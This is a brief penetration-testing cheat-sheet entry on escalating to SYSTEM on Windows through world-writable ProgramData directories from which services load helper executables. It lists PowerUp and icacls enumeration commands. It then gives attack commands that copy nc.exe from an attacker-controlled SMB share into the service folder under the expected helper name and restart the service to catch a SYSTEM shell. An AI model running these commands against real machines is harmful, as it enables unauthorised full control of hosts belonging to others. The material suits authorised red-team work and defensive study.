# Writable ProgramData Service Binary Path

Some services load helper executables from `C:\ProgramData\<AppName>\` at start/stop.  
If that directory is world-writable, plant a payload with the expected name before restarting the service.

**Enumerate writable service paths:**
```powershell
# PowerUp
. .\PowerUp.ps1; Invoke-AllChecks | Where-Object {$_.ModifiableFile}

# manual icacls check on service binary path
sc.exe qc <ServiceName>
icacls "C:\ProgramData\<AppName>"
```

**Drop payload and trigger:**
```cmd
copy \\<LHOST>\smb\nc.exe C:\ProgramData\<AppName>\taskkill.exe
net stop <ServiceName>
net start <ServiceName>
```

The service runs as SYSTEM — shell lands as `NT AUTHORITY\SYSTEM`.

Also check `sc.exe qc` output for services whose `BINARY_PATH_NAME` points to a user-writable directory directly — same exploitation path without the intermediate helper binary.
